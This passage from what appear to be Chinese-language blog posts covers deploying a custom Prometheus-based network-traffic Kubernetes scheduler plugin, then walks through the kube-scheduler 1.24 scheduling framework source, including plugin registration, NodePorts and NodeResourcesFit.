的地址，网卡名称，和获取数据的大小，故整个结构体如下，另外，参数结构必须遵循\u0026lt;Plugin Name\u0026gt;Args 格式的名称。\ntype NetworkTrafficArgs struct { IP string `json:\u0026quot;ip\u0026quot;` DeviceName string `json:\u0026quot;deviceName\u0026quot;` TimeRange int `json:\u0026quot;timeRange\u0026quot;` } 为了使这个类型的数据作为 KubeSchedulerConfiguration 可以解析的结构，还需要做一步操作，就是在扩展APIServer时扩展对应的资源类型。在这里kubernetes中提供两种方法来扩展 KubeSchedulerConfiguration 的资源类型。\n一种是旧版中提供了 framework.DecodeInto 函数可以做这个操作\nfunc New(plArgs *runtime.Unknown, handle framework.FrameworkHandle) (framework.Plugin, error) { args := Args{} if err := framework.DecodeInto(plArgs, \u0026amp;args); err != nil { return nil, err } ... } 另外一种方式是必须实现对应的深拷贝方法，例如 NodeLabel 中的\n// +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object // NodeLabelArgs holds arguments used to configure the NodeLabel plugin. type NodeLabelArgs struct { metav1.TypeMeta // PresentLabels should be present for the node to be considered a fit for hosting the pod PresentLabels []string // AbsentLabels should be absent for the node to be considered a fit for hosting the pod AbsentLabels []string // Nodes that have labels in the list will get a higher score. PresentLabelsPreference []string // Nodes that don't have labels in the list will get a higher score. AbsentLabelsPreference []string } 最后将其注册到register中，整个行为与扩展APIServer是类似的\n// addKnownTypes registers known types to the given scheme func addKnownTypes(scheme *runtime.Scheme) error { scheme.AddKnownTypes(SchemeGroupVersion, \u0026amp;KubeSchedulerConfiguration{}, \u0026amp;Policy{}, \u0026amp;InterPodAffinityArgs{}, \u0026amp;NodeLabelArgs{}, \u0026amp;NodeResourcesFitArgs{}, \u0026amp;PodTopologySpreadArgs{}, \u0026amp;RequestedToCapacityRatioArgs{}, \u0026amp;ServiceAffinityArgs{}, \u0026amp;VolumeBindingArgs{}, \u0026amp;NodeResourcesLeastAllocatedArgs{}, \u0026amp;NodeResourcesMostAllocatedArgs{}, ) scheme.AddKnownTypes(schema.GroupVersion{Group: \u0026quot;\u0026quot;, Version: runtime.APIVersionInternal}, \u0026amp;Policy{}) return nil } Notes：对于生成深拷贝函数及其他文件，可以使用 kubernetes 代码库中的脚本 kubernetes/hack/update-codegen.sh\n这里为了方便使用了 framework.DecodeInto 的方式。\n项目部署 准备 scheduler 的 profile，可以看到，我们自定义的参数，就可以被识别为 KubeSchedulerConfiguration 的资源类型了。\napiVersion: kubescheduler.config.k8s.io/v1beta1 kind: KubeSchedulerConfiguration clientConnection: kubeconfig: /mnt/d/src/go_work/customScheduler/scheduler.conf profiles: - schedulerName: custom-scheduler plugins: score: enabled: - name: \u0026quot;NetworkTraffic\u0026quot; disabled: - name: \u0026quot;*\u0026quot; pluginConfig: - name: \u0026quot;NetworkTraffic\u0026quot; args: ip: \u0026quot;http://10.0.0.4:9090\u0026quot; deviceName: \u0026quot;eth0\u0026quot; timeRange: 60 如果需要部署到集群内部，可以打包成镜像\nFROM golang:alpine AS builder MAINTAINER cylon WORKDIR /scheduler COPY ./ /scheduler ENV GOPROXY https://goproxy.cn,direct RUN \\ sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories \u0026amp;\u0026amp; \\ apk add upx \u0026amp;\u0026amp; \\ GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags \u0026quot;-s -w\u0026quot; -o scheduler main.go \u0026amp;\u0026amp; \\ upx -1 scheduler \u0026amp;\u0026amp; \\ chmod +x scheduler FROM alpine AS runner WORKDIR /go/scheduler COPY --from=builder /scheduler/scheduler . COPY --from=builder /scheduler/scheduler.yaml /etc/ VOLUME [\u0026quot;./scheduler\u0026quot;] 部署在集群内部所需的资源清单\napiVersion: v1 kind: ServiceAccount metadata: name: scheduler-sa namespace: kube-system --- apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: scheduler subjects: - kind: ServiceAccount name: scheduler-sa namespace: kube-system roleRef: kind: ClusterRole name: system:kube-scheduler apiGroup: rbac.authorization.k8s.io --- apiVersion: apps/v1 kind: Deployment metadata: name: custom-scheduler namespace: kube-system labels: component: custom-scheduler spec: selector: matchLabels: component: custom-scheduler template: metadata: labels: component: custom-scheduler spec: serviceAccountName: scheduler-sa priorityClassName: system-cluster-critical containers: - name: scheduler image: cylonchau/custom-scheduler:v0.0.1 imagePullPolicy: IfNotPresent command: - ./scheduler - --config=/etc/scheduler.yaml - --v=3 livenessProbe: httpGet: path: /healthz port: 10251 initialDelaySeconds: 15 readinessProbe: httpGet: path: /healthz port: 10251 启动自定义 scheduler，这里通过简单的二进制方式启动，所以需要一个kubeconfig做认证文件\n./main --logtostderr=true \\ --address=127.0.0.1 \\ --v=3 \\ --config=`pwd`/scheduler.yaml \\ --kubeconfig=`pwd`/scheduler.conf 启动后为了验证方便性，关闭了原来的 kube-scheduler 服务，因为原来的 kube-scheduler 已经作为HA中的master，所以不会使用自定义的 scheduler 导致pod pending。\n验证结果 准备一个需要部署的Pod，指定使用的调度器名称\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment spec: selector: matchLabels: app: nginx replicas: 2 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx:1.14.2 ports: - containerPort: 80 schedulerName: custom-scheduler 这里实验环境为2个节点的kubernetes集群，master与node01，因为master的服务比node01要多，这种情况下不管怎样，调度结果永远会被调度到node01上。\n$ kubectl get pods -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-deployment-69f76b454c-lpwbl 1/1 Running 0 43s 192.168.0.17 node01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; nginx-deployment-69f76b454c-vsb7k 1/1 Running 0 43s 192.168.0.16 node01 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 而调度器的日志如下\nI0808 01:56:31.098189 27131 networktraffic.go:83] [NetworkTraffic] node 'node01' bandwidth: %!s(int64=12541068340) I0808 01:56:31.098461 27131 networktraffic.go:70] [NetworkTraffic] Nodes final score: [{master-machine 0} {node01 12541068340}] I0808 01:56:31.098651 27131 networktraffic.go:70] [NetworkTraffic] Nodes final score: [{master-machine 0} {node01 71}] I0808 01:56:31.098911 27131 networktraffic.go:73] [NetworkTraffic] Nodes final score: [{master-machine 0} {node01 71}] I0808 01:56:31.099275 27131 default_binder.go:51] Attempting to bind default/nginx-deployment-69f76b454c-vsb7k to node01 I0808 01:56:31.101414 27131 eventhandlers.go:225] add event for scheduled pod default/nginx-deployment-69f76b454c-lpwbl I0808 01:56:31.101414 27131 eventhandlers.go:205] delete event for unscheduled pod default/nginx-deployment-69f76b454c-lpwbl I0808 01:56:31.103604 27131 scheduler.go:609] \u0026quot;Successfully bound pod to node\u0026quot; pod=\u0026quot;default/nginx-deployment-69f76b454c-lpwbl\u0026quot; node=\u0026quot;no de01\u0026quot; evaluatedNodes=2 feasibleNodes=2 I0808 01:56:31.104540 27131 scheduler.go:609] \u0026quot;Successfully bound pod to node\u0026quot; pod=\u0026quot;default/nginx-deployment-69f76b454c-vsb7k\u0026quot; node=\u0026quot;no de01\u0026quot; evaluatedNodes=2 feasibleNodes=2 Reference [1] scheduling config\n[2] kube-scheduler\n[3] scheduling-plugins\n[4] custom scheduler plugins\n[5] ssues #79384\n[6] scheduler perf tuning\n[7] creating a kube-scheduler plugin\n","permalink":"https://www.oomkill.com/2022/08/ch22-custom-scheduler/","summary":"","title":"基于Prometheus的Kubernetes网络调度器"},{"content":"调度框架 [1] 本文基于 kubernetes 1.24 进行分析\n调度框架（Scheduling Framework）是Kubernetes 的调度器 kube-scheduler 设计的的可插拔架构，将插件（调度算法）嵌入到调度上下文的每个扩展点中，并编译为 kube-scheduler\n在 kube-scheduler 1.22 之后，在 pkg/scheduler/framework/interface.go 中定义了一个 Plugin 的 interface，这个 interface 作为了所有插件的父级。而每个未调度的 Pod，Kubernetes 调度器会根据一组规则尝试在集群中寻找一个节点。\ntype Plugin interface { Name() string } 下面会对每个算法是如何实现的进行分析\n在初始化 scheduler 时，会创建一个 profile，profile是关于 scheduler 调度配置相关的定义\nfunc New(client clientset.Interface, ... profiles, err := profile.NewMap(options.profiles, registry, recorderFactory, stopCh, frameworkruntime.WithComponentConfigVersion(options.componentConfigVersion), frameworkruntime.WithClientSet(client), frameworkruntime.WithKubeConfig(options.kubeConfig), frameworkruntime.WithInformerFactory(informerFactory), frameworkruntime.WithSnapshotSharedLister(snapshot), frameworkruntime.WithPodNominator(nominator), frameworkruntime.WithCaptureProfile(frameworkruntime.CaptureProfile(options.frameworkCapturer)), frameworkruntime.WithClusterEventMap(clusterEventMap), frameworkruntime.WithParallelism(int(options.parallelism)), frameworkruntime.WithExtenders(extenders), ) if err != nil { return nil, fmt.Errorf(\u0026quot;initializing profiles: %v\u0026quot;, err) } if len(profiles) == 0 { return nil, errors.New(\u0026quot;at least one profile is required\u0026quot;) } .... } 关于 profile 的实现，则为 KubeSchedulerProfile，也是作为 yaml生成时传入的配置\n// KubeSchedulerProfile 是一个 scheduling profile. type KubeSchedulerProfile struct { // SchedulerName 是与此配置文件关联的调度程序的名称。 // 如果 SchedulerName 与 pod “spec.schedulerName”匹配，则使用此配置文件调度 pod。 SchedulerName string // Plugins指定应该启用或禁用的插件集。 // 启用的插件是除了默认插件之外应该启用的插件。禁用插件应是禁用的任何默认插件。 // 当没有为扩展点指定启用或禁用插件时，将使用该扩展点的默认插件（如果有）。 // 如果指定了 QueueSort 插件， // 则必须为所有配置文件指定相同的 QueueSort Plugin 和 PluginConfig。 // 这个Plugins展现的形式则是调度上下文中的所有扩展点(这是抽象)，实际中会表现为多个扩展点 Plugins *Plugins // PluginConfig 是每个插件的一组可选的自定义插件参数。 // 如果省略PluginConfig参数等同于使用该插件的默认配置。 PluginConfig []PluginConfig } 对于 profile.NewMap 就是根据给定的配置来构建这个framework，因为配置可能是存在多个的。而 Registry 则是所有可用插件的集合，内部构造则是 PluginFactory ,通过函数来构建出对应的 plugin\nfunc NewMap(cfgs []config.KubeSchedulerProfile, r frameworkruntime.Registry, recorderFact RecorderFactory, stopCh \u0026lt;-chan struct{}, opts ...frameworkruntime.Option) (Map, error) { m := make(Map) v := cfgValidator{m: m} for _, cfg := range cfgs { p, err := newProfile(cfg, r, recorderFact, stopCh, opts...) if err != nil { return nil, fmt.Errorf(\u0026quot;creating profile for scheduler name %s: %v\u0026quot;, cfg.SchedulerName, err) } if err := v.validate(cfg, p); err != nil { return nil, err } m[cfg.SchedulerName] = p } return m, nil } // newProfile 给的配置构建出一个profile func newProfile(cfg config.KubeSchedulerProfile, r frameworkruntime.Registry, recorderFact RecorderFactory, stopCh \u0026lt;-chan struct{}, opts ...frameworkruntime.Option) (framework.Framework, error) { recorder := recorderFact(cfg.SchedulerName) opts = append(opts, frameworkruntime.WithEventRecorder(recorder)) return frameworkruntime.NewFramework(r, \u0026amp;cfg, stopCh, opts...) } 可以看到最终返回的是一个 Framework 。那么来看下这个 Framework\nFramework 是一个抽象，管理着调度过程中所使用的所有插件，并在调度上下文中适当的位置去运行对应的插件\ntype Framework interface { Handle // QueueSortFunc 返回对调度队列中的 Pod 进行排序的函数 // 也就是less，在Sort打分阶段的打分函数 QueueSortFunc() LessFunc // RunPreFilterPlugins 运行配置的一组PreFilter插件。 // 如果这组插件中，任何一个插件失败，则返回 *Status 并设置为non-success。 // 如果返回状态为non-success，则调度周期中止。 // 它还返回一个 PreFilterResult，它可能会影响到要评估下游的节点。 RunPreFilterPlugins(ctx context.Context, state *CycleState, pod *v1.Pod) (*PreFilterResult, *Status) // RunPostFilterPlugins 运行配置的一组PostFilter插件。 // PostFilter 插件是通知性插件，在这种情况下应配置为先执行并返回 Unschedulable 状态， // 或者尝试更改集群状态以使 pod 在未来的调度周期中可能会被调度。 RunPostFilterPlugins(ctx context.Context, state *CycleState, pod *v1.Pod, filteredNodeStatusMap NodeToStatusMap) (*PostFilterResult, *Status) // RunPreBindPlugins 运行配置的一组 PreBind 插件。 // 如果任何一个插件返回错误，则返回 *Status 并且code设置为non-success。 // 如果code为“Unschedulable”，则调度检查失败， // 则认为是内部错误。在任何一种情况下，Pod都不会被bound。 RunPreBindPlugins(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) *Status // RunPostBindPlugins 运行配置的一组PostBind插件 RunPostBindPlugins(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) // RunReservePluginsReserve运行配置的一组Reserve插件的Reserve方法。 // 如果在这组调用中的任何一个插件返回错误，则不会继续运行剩余调用的插件并返回错误。 // 在这种情况下，pod将不能被调度。 RunReservePluginsReserve(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) *Status // RunReservePluginsUnreserve运行配置的一组Reserve插件的Unreserve方法。 RunReservePluginsUnreserve(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) // RunPermitPlugins运行配置的一组Permit插件。 // 如果这些插件中的任何一个返回“Success”或“Wait”之外的状态，则它不会继续运行其余插件并返回错误。 // 否则，如果任何插件返回 “Wait”，则此函数将创建等待pod并将其添加到当前等待pod的map中， // 并使用“Wait” code返回状态。 Pod将在Permit插件返回的最短持续时间内保持等待pod。 RunPermitPlugins(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) *Status // 如果pod是waiting pod，WaitOnPermit 将阻塞，直到等待的pod被允许或拒绝。 WaitOnPermit(ctx context.Context, pod *v1.Pod) *Status // RunBindPlugins运行配置的一组bind插件。 Bind插件可以选择是否处理Pod。 // 如果 Bind 插件选择跳过binding，它应该返回 code=5(\u0026quot;skip\u0026quot;)状态。 // 否则，它应该返回“Error”或“Success”。 // 如果没有插件处理绑定，则RunBindPlugins返回code=5(\u0026quot;skip\u0026quot;)的状态。 RunBindPlugins(ctx context.Context, state *CycleState, pod *v1.Pod, nodeName string) *Status // 如果至少定义了一个filter插件，则HasFilterPlugins返回true HasFilterPlugins() bool // 如果至少定义了一个PostFilter插件，则HasPostFilterPlugins返回 true。 HasPostFilterPlugins() bool // 如果至少定义了一个Score插件，则HasScorePlugins返回 true。 HasScorePlugins() bool // ListPlugins将返回map。key为扩展点名称，value则是配置的插件列表。 ListPlugins() *config.Plugins // ProfileName则是与profile name关联的framework ProfileName() string } 而实现这个抽象的则是 frameworkImpl；frameworkImpl 是初始化与运行 scheduler plugins 的组件，并在调度上下文中会运行这些扩展点\ntype frameworkImpl struct { registry Registry snapshotSharedLister framework.SharedLister waitingPods *waitingPodsMap scorePluginWeight map[string]int queueSortPlugins []framework.QueueSortPlugin preFilterPlugins []framework.PreFilterPlugin filterPlugins []framework.FilterPlugin postFilterPlugins []framework.PostFilterPlugin preScorePlugins []framework.PreScorePlugin scorePlugins []framework.ScorePlugin reservePlugins []framework.ReservePlugin preBindPlugins []framework.PreBindPlugin bindPlugins []framework.BindPlugin postBindPlugins []framework.PostBindPlugin permitPlugins []framework.PermitPlugin clientSet clientset.Interface kubeConfig *restclient.Config eventRecorder events.EventRecorder informerFactory informers.SharedInformerFactory metricsRecorder *metricsRecorder profileName string extenders []framework.Extender framework.PodNominator parallelizer parallelize.Parallelizer } 那么来看下 Registry ，Registry 是作为一个可用插件的集合。framework 使用 registry 来启用和对插件配置的初始化。在初始化框架之前，所有插件都必须在注册表中。表现形式就是一个 map[]；key 是插件的名称，value是 PluginFactory 。\ntype Registry map[string]PluginFactory 而在 pkg\\scheduler\\framework\\plugins\\registry.go 中会将所有的 in-tree plugin 注册进来。通过 NewInTreeRegistry 。后续如果还有插件要注册，可以通过 WithFrameworkOutOfTreeRegistry 来注册其他的插件。\nfunc NewInTreeRegistry() runtime.Registry { fts := plfeature.Features{ EnableReadWriteOncePod: feature.DefaultFeatureGate.Enabled(features.ReadWriteOncePod), EnableVolumeCapacityPriority: feature.DefaultFeatureGate.Enabled(features.VolumeCapacityPriority), EnableMinDomainsInPodTopologySpread: feature.DefaultFeatureGate.Enabled(features.MinDomainsInPodTopologySpread), EnableNodeInclusionPolicyInPodTopologySpread: feature.DefaultFeatureGate.Enabled(features.NodeInclusionPolicyInPodTopologySpread), } return runtime.Registry{ selectorspread.Name: selectorspread.New, imagelocality.Name: imagelocality.New, tainttoleration.Name: tainttoleration.New, nodename.Name: nodename.New, nodeports.Name: nodeports.New, nodeaffinity.Name: nodeaffinity.New, podtopologyspread.Name: runtime.FactoryAdapter(fts, podtopologyspread.New), nodeunschedulable.Name: nodeunschedulable.New, noderesources.Name: runtime.FactoryAdapter(fts, noderesources.NewFit), noderesources.BalancedAllocationName: runtime.FactoryAdapter(fts, noderesources.NewBalancedAllocation), volumebinding.Name: runtime.FactoryAdapter(fts, volumebinding.New), volumerestrictions.Name: runtime.FactoryAdapter(fts, volumerestrictions.New), volumezone.Name: volumezone.New, nodevolumelimits.CSIName: runtime.FactoryAdapter(fts, nodevolumelimits.NewCSI), nodevolumelimits.EBSName: runtime.FactoryAdapter(fts, nodevolumelimits.NewEBS), nodevolumelimits.GCEPDName: runtime.FactoryAdapter(fts, nodevolumelimits.NewGCEPD), nodevolumelimits.AzureDiskName: runtime.FactoryAdapter(fts, nodevolumelimits.NewAzureDisk), nodevolumelimits.CinderName: runtime.FactoryAdapter(fts, nodevolumelimits.NewCinder), interpodaffinity.Name: interpodaffinity.New, queuesort.Name: queuesort.New, defaultbinder.Name: defaultbinder.New, defaultpreemption.Name: runtime.FactoryAdapter(fts, defaultpreemption.New), } } 这里插入一个题外话，关于 in-tree plugin\n在这里没有找到关于，kube-scheduler ，只是找到有关的概念，大概可以解释为，in-tree表示为随kubernetes官方提供的二进制构建的 plugin 则为 in-tree，而独立于kubernetes代码库之外的为 out-of-tree [3] 。这种情况下，可以理解为，AA则是 out-of-tree 而 Pod, DeplymentSet 等是 in-tree。\n接下来回到初始化 scheduler ，在初始化一个 scheduler 时，会通过NewInTreeRegistry 来初始化\nfunc New(client clientset.Interface, .... registry := frameworkplugins.NewInTreeRegistry() if err := registry.Merge(options.frameworkOutOfTreeRegistry); err != nil { return nil, err } ... profiles, err := profile.NewMap(options.profiles, registry, recorderFactory, stopCh, frameworkruntime.WithComponentConfigVersion(options.componentConfigVersion), frameworkruntime.WithClientSet(client), frameworkruntime.WithKubeConfig(options.kubeConfig), frameworkruntime.WithInformerFactory(informerFactory), frameworkruntime.WithSnapshotSharedLister(snapshot), frameworkruntime.WithPodNominator(nominator), frameworkruntime.WithCaptureProfile(frameworkruntime.CaptureProfile(options.frameworkCapturer)), frameworkruntime.WithClusterEventMap(clusterEventMap), frameworkruntime.WithParallelism(int(options.parallelism)), frameworkruntime.WithExtenders(extenders), ) ... } 接下来在调度上下文 scheduleOne 中 schedulePod 时，会通过 framework 调用对应的插件来处理这个扩展点工作。具体的体现在，pkg\\scheduler\\schedule_one.go 中的预选阶段\nfunc (sched *Scheduler) schedulePod(ctx context.Context, fwk framework.Framework, state *framework.CycleState, pod *v1.Pod) (result ScheduleResult, err error) { trace := utiltrace.New(\u0026quot;Scheduling\u0026quot;, utiltrace.Field{Key: \u0026quot;namespace\u0026quot;, Value: pod.Namespace}, utiltrace.Field{Key: \u0026quot;name\u0026quot;, Value: pod.Name}) defer trace.LogIfLong(100 * time.Millisecond) if err := sched.Cache.UpdateSnapshot(sched.nodeInfoSnapshot); err != nil { return result, err } trace.Step(\u0026quot;Snapshotting scheduler cache and node infos done\u0026quot;) if sched.nodeInfoSnapshot.NumNodes() == 0 { return result, ErrNoNodesAvailable } feasibleNodes, diagnosis, err := sched.findNodesThatFitPod(ctx, fwk, state, pod) if err != nil { return result, err } trace.Step(\u0026quot;Computing predicates done\u0026quot;) 与其他扩展点部分，在调度上下文 scheduleOne 中可以很好的看出，功能都是 framework 提供的。\nfunc (sched *Scheduler) scheduleOne(ctx context.Context) { ... scheduleResult, err := sched.SchedulePod(schedulingCycleCtx, fwk, state, pod) ... // Run the Reserve method of reserve plugins. if sts := fwk.RunReservePluginsReserve(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost); !sts.IsSuccess() { } ... // Run \u0026quot;permit\u0026quot; plugins. runPermitStatus := fwk.RunPermitPlugins(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) // One of the plugins returned status different than success or wait. fwk.RunReservePluginsUnreserve(schedulingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) ... // bind the pod to its host asynchronously (we can do this b/c of the assumption step above). go func() { ... waitOnPermitStatus := fwk.WaitOnPermit(bindingCycleCtx, assumedPod) if !waitOnPermitStatus.IsSuccess() { ... // trigger un-reserve plugins to clean up state associated with the reserved Pod fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) } // Run \u0026quot;prebind\u0026quot; plugins. preBindStatus := fwk.RunPreBindPlugins(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) ... // trigger un-reserve plugins to clean up state associated with the reserved Pod fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) ... ... // trigger un-reserve plugins to clean up state associated with the reserved Pod fwk.RunReservePluginsUnreserve(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) ... // Run \u0026quot;postbind\u0026quot; plugins. fwk.RunPostBindPlugins(bindingCycleCtx, state, assumedPod, scheduleResult.SuggestedHost) ... } 插件 [4] 插件（Plugins）（也可以算是调度策略）在 kube-scheduler 中的实现为 framework plugin，插件API的实现分为两个步骤**：register** 和 configured，然后都实现了其父方法 Plugin。然后可以通过配置（kube-scheduler --config 提供）启动或禁用插件；除了默认插件外，还可以实现自定义调度插件与默认插件进行绑定。\ntype Plugin interface { Name() string } // sort扩展点 type QueueSortPlugin interface { Plugin Less(*v1.pod, *v1.pod) bool } // PreFilter扩展点 type PreFilterPlugin interface { Plugin PreFilter(context.Context, *framework.CycleState, *v1.pod) error } 插件的载入过程 在 scheduler 被启动时，会 scheduler.New(cc.Client.. 这个时候会传入 profiles，整个的流如下：\nNewScheduler ：kubernetes/cmd/kube-scheduler/app/server.go profile.NewMap：kubernetes/pkg/scheduler/scheduler.go newProfile：kubernetes/pkg/scheduler/scheduler.go frameworkruntime.NewFramework：kubernetes/pkg/scheduler/framework/runtime/framework.go pluginsNeeded：kubernetes/pkg/scheduler/framework/runtime/framework.go NewScheduler 我们了解如何 New 一个 scheduler 即为 Setup 中去配置这些参数，\nfunc Setup(ctx context.Context, opts *options.Options, outOfTreeRegistryOptions ...Option) (*schedulerserverconfig.CompletedConfig, *scheduler.Scheduler, error) { ... // Create the scheduler. sched, err := scheduler.New(cc.Client, cc.InformerFactory, cc.DynInformerFactory, recorderFactory, ctx.Done(), scheduler.WithComponentConfigVersion(cc.ComponentConfig.TypeMeta.APIVersion), scheduler.WithKubeConfig(cc.KubeConfig), scheduler.WithProfiles(cc.ComponentConfig.Profiles...), scheduler.WithPercentageOfNodesToScore(cc.ComponentConfig.PercentageOfNodesToScore), scheduler.WithFrameworkOutOfTreeRegistry(outOfTreeRegistry), scheduler.WithPodMaxBackoffSeconds(cc.ComponentConfig.PodMaxBackoffSeconds), scheduler.WithPodInitialBackoffSeconds(cc.ComponentConfig.PodInitialBackoffSeconds), scheduler.WithPodMaxInUnschedulablePodsDuration(cc.PodMaxInUnschedulablePodsDuration), scheduler.WithExtenders(cc.ComponentConfig.Extenders...), scheduler.WithParallelism(cc.ComponentConfig.Parallelism), scheduler.WithBuildFrameworkCapturer(func(profile kubeschedulerconfig.KubeSchedulerProfile) { // Profiles are processed during Framework instantiation to set default plugins and configurations. Capturing them for logging completedProfiles = append(completedProfiles, profile) }), ) ... } profile.NewMap 在 scheduler.New 中，会根据配置生成profile，而 profile.NewMap 会完成这一步\nfunc New(client clientset.Interface, ... clusterEventMap := make(map[framework.ClusterEvent]sets.String) profiles, err := profile.NewMap(options.profiles, registry, recorderFactory, stopCh, frameworkruntime.WithComponentConfigVersion(options.componentConfigVersion), frameworkruntime.WithClientSet(client), frameworkruntime.WithKubeConfig(options.kubeConfig), frameworkruntime.WithInformerFactory(informerFactory), frameworkruntime.WithSnapshotSharedLister(snapshot), frameworkruntime.WithPodNominator(nominator), frameworkruntime.WithCaptureProfile(frameworkruntime.CaptureProfile(options.frameworkCapturer)), frameworkruntime.WithClusterEventMap(clusterEventMap), frameworkruntime.WithParallelism(int(options.parallelism)), frameworkruntime.WithExtenders(extenders), ) ... } NewFramework newProfile 返回的则是一个创建好的 framework\nfunc newProfile(cfg config.KubeSchedulerProfile, r frameworkruntime.Registry, recorderFact RecorderFactory, stopCh \u0026lt;-chan struct{}, opts ...frameworkruntime.Option) (framework.Framework, error) { recorder := recorderFact(cfg.SchedulerName) opts = append(opts, frameworkruntime.WithEventRecorder(recorder)) return frameworkruntime.NewFramework(r, \u0026amp;cfg, stopCh, opts...) } 最终会走到 pluginsNeeded，这里会根据配置中开启的插件而返回一个插件集，这个就是最终在每个扩展点中药执行的插件。\nfunc (f *frameworkImpl) pluginsNeeded(plugins *config.Plugins) sets.String { pgSet := sets.String{} if plugins == nil { return pgSet } find := func(pgs *config.PluginSet) { for _, pg := range pgs.Enabled { pgSet.Insert(pg.Name) } } // 获取到所有的扩展点，找到为Enabled的插件加入到pgSet for _, e := range f.getExtensionPoints(plugins) { find(e.plugins) } // Parse MultiPoint separately since they are not returned by f.getExtensionPoints() find(\u0026amp;plugins.MultiPoint) return pgSet } 插件的执行 在对插件源码部分分析，会找几个典型的插件进行分析，而不会对全部的进行分析，因为总的来说是大同小异，分析的插件有 NodePorts，NodeResourcesFit，podtopologyspread\nNodePorts 这里以一个简单的插件来分析；NodePorts 插件用于检查Pod请求的端口，在节点上是否为空闲端口。\nNodePorts 实现了 FilterPlugin 和 PreFilterPlugin\nPreFilter 将会被 framework 中 PreFilter 扩展点被调用。\nfunc (pl *NodePorts) PreFilter(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod) (*framework.PreFilterResult, *framework.Status) { s := getContainerPorts(pod) // 或得Pod得端口 // 写入状态 cycleState.Write(preFilterStateKey, preFilterState(s)) return nil, nil } Filter 将会被 framework 中 Filter 扩展点被调用。\n// Filter invoked at the filter extension point. func (pl *NodePorts) Filter(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod, nodeInfo *framework.NodeInfo) *framework.Status { wantPorts, err := getPreFilterState(cycleState) if err != nil { return framework.AsStatus(err) } fits := fitsPorts(wantPorts, nodeInfo) if !fits { return framework.NewStatus(framework.Unschedulable, ErrReason) } return nil } func fitsPorts(wantPorts []*v1.ContainerPort, nodeInfo *framework.NodeInfo) bool { // 对比existingPorts 和 wantPorts是否冲突，冲突则调度失败 existingPorts := nodeInfo.UsedPorts for _, cp := range wantPorts { if existingPorts.CheckConflict(cp.HostIP, string(cp.Protocol), cp.HostPort) { return false } } return true } New ，初始化新插件，在 register 中注册得\nfunc New(_ runtime.Object, _ framework.Handle) (framework.Plugin, error) { return \u0026amp;NodePorts{}, nil } 在调用中，如果有任何一个插件返回错误，则跳过该扩展点注册得其他插件，返回失败。\nfunc (f *frameworkImpl) RunFilterPlugins( ctx context.Context, state *framework.CycleState, pod *v1.Pod, nodeInfo *framework.NodeInfo, ) framework.PluginToStatus { statuses := make(framework.PluginToStatus) for _, pl := range f.filterPlugins { pluginStatus := f.runFilterPlugin(ctx, pl, state, pod, nodeInfo) if !pluginStatus.IsSuccess() { if !pluginStatus.IsUnschedulable() errStatus := framework.AsStatus(fmt.Errorf(\u0026quot;running %q filter plugin: %w\u0026quot;, pl.Name(), pluginStatus.AsError())).WithFailedPlugin(pl.Name()) return map[string]*framework.Status{pl.Name(): errStatus} } pluginStatus.SetFailedPlugin(pl.Name()) statuses[pl.Name()] = pluginStatus } } return statuses } 返回得状态是一个 Status 结构体，该结构体表示了插件运行的结果。由 Code、reasons、（可选）err 和 failedPlugin （失败的那个插件名）组成。当 code 不是 Success 时，应说明原因。而且，当 code 为 Success 时，其他所有字段都应为空。nil 状态也被视为成功。\ntype Status struct { code Code reasons []string err error // failedPlugin is an optional field that records the plugin name a Pod failed by. // It's set by the framework when code is Error, Unschedulable or UnschedulableAndUnresolvable. failedPlugin string } NodeResourcesFit [5] NodeResourcesFit 扩展检查节点是否拥有 Pod 请求的所有资源。分数可以使用以下三种策略之一，扩展点为：preFilter， filter，score\nLeastAllocated （默认） MostAllocated RequestedToCapacityRatio Fit NodeResourcesFit PreFilter 可以看到调用得 computePodResourceRequest\n// PreFilter invoked at the prefilter extension point. func (f *Fit) PreFilter(ctx context.Context, cycleState *framework.CycleState, pod *v1.Pod) (*framework.PreFilterResult, *framework.Status) { cycleState.Write(preFilterStateKey, computePodResourceRequest(pod)) return nil, nil } computePodResourceRequest 这里有一个注释，总体解释起来是这样得：computePodResourceRequest ，返回值（ framework.Resource）覆盖了每一个维度中资源的最大宽度。因为将按照 init-containers , containers 得顺序运行，会通过迭代方式收集每个维度中的最大值。计算时会对常规容器的资源向量求和，因为containers 运行会同时运行多个容器。计算示例为：\nPod: InitContainers IC1: CPU: 2 Memory: 1G IC2: CPU: 2 Memory: 3G Containers C1: CPU: 2 Memory: 1G C2: CPU: 1 Memory: 1G 在维度1中（InitContainers）所需资源最大值时，CPU=2, Memory=3G；而维度2（Containers）所需资源最大值为：CPU=2, Memory=1G；那么最终结果为 CPU=3, Memory=3G，因为在维度1，最大资源时Memory=3G；而维度2最大资源是CPU=1+2, Memory=1+1，取每个维度中最大资源最大宽度即为 CPU=3, Memory=3G。\n下面则看下代码得实现\nfunc computePodResourceRequest(pod *v1.Pod) *preFilterState { result := \u0026amp;preFilterState{} for _, container := range pod.Spec.Containers { result.Add(container.Resources.Requests) } // 取最大得资源 for _, container := range pod.Spec.InitContainers { result.SetMaxResource(container.Resources.Requests) } // 如果Overhead正在使用，需要将其计算到总资源中 if 